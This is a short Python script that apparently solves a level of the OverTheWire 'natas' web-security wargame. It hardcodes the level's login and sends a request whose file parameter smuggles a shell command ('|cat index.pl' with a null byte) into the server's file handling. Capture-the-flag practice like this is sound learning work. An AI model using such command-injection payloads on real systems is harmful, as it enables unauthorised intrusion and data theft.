import requests
import urllib
import string
import os
import base64

from utils import utils


basic_auth = ('natas29', '31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns')

url = "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="

def send_request(session) -> str:
    response = session.get(url,
                    headers=headers)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    res = send_request(session)
    print(res)